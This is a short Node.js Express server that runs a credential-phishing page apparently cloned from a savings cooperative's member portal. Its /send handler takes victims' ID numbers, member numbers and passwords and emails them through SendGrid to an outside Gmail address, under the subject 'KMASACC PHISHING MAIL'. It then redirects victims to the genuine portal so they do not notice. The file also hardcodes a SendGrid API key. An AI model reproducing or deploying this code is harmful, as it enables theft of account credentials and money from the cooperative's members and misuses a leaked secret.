const express = require('express')
const bodyParser = require('body-parser')
const exphbs = require('express-handlebars')
const path = require('path');
const sgMail = require('@sendgrid/mail');

const app = express();

//view engine setup
app.engine('handlebars',exphbs())
app.set('view engine','handlebars')

// Static folder
app.use('/public', express.static(path.join(__dirname,'public')))

// Body parser Middleware
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())

//render cloned page
//default view in views/contact.handlebars
app.get('/',(req, res) => {
	res.render('kemsacc')
})

//send email on sendgrid
sgMail.setApiKey("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");

app.post('/send', (req, res) => {

    const output = `
		<p>You have a new password entry from Phishing Portal</p>
		<h3>User Details</h3>
		<ul>
            <li>ID NO: ${req.body.idno}</li>
            <li>MEMBER NO: ${req.body.MemberNo}</li>
			<li>Password:${req.body.Pass}</li>
		</ul>
	`
    const msg = {
        to: 'kamaajohn2015@gmail.com',
        from: 'supporit@gmail.com',
        subject: 'KMASACC PHISHING MAIL',
        text: 'Soo Easy',
        html: output,
      };
      console.log("Sending an email....");
      sgMail.send(msg);
      console.log("Email sent....");
      res.redirect('https://www.portal.kmasacco.com/')
})

var port = process.env.PORT || 8000

app.listen(port, function() {
    console.log("App is running on port " + port);
});
